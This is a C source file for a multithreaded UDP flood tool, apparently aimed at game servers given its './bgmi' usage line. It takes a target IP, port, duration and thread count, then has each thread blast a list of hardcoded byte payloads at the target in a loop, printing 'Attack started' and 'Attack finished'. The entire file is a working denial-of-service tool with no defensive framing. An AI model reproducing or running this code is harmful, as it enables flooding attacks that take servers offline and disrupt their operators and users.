#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Expanded and larger payloads (increased by ~50%)
    char *payloads[] = {
        "\x56\x34\x12\x78\x39\x4b\x6e\xd1\x05\x6f\xfa\xf3\x02\xbc\x23\x2b\x4d\x8e\x91",
        "\x7a\x89\xb6\x3e\x77\xc4\x94\x62\x38\x47\x91\xab\xef\x11\xa0\x51\xba\xc9\x74",
        "\x12\xbe\x4f\xfe\x47\x12\x66\xab\x10\x0a\xf2\x3b\x13\x8e\x56\xd1\xea\x27\x99",
        "\x02\x39\x19\x08\x29\x9f\x9c\xda\xb6\xd3\x76\x57\x52\x54\x88\x99\x26\x7a\xc7",
        "\xaf\xb7\xdc\x07\x9f\x67\x23\x77\xf4\x52\x63\xef\xd9\xff\x39\x1a\xb1\xcd\x43",
        "\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff\xe1\x3a\x3b\x5c",
        "\xd9\x00\xff\xff\xde\xad\xbe\xef\xba\xbe\xc0\xca\xfe\xba\xbe\xa7\xf4\x5b\x85",
        "\x72\xfe\x1d\x13\x00\x00\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xc0",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00\xaa\xbb\xcc\xdd",
        "\x4b\x6f\x6e\x6f\x75\x74\x20\x61\x6e\x64\x20\x73\x68\x6f\x77\x70\x6f\x69\x6e\x74\x69\x6e\x67\x66\x6f\x72\x73\x61\x67\x65",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69",
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\xaa\xbb\xcc\xdd\xee\xff\x88\x77\x66",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00\xcc\xdd\xee\xff",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            // Increased payload size through array or dynamic size if needed
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID:%lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}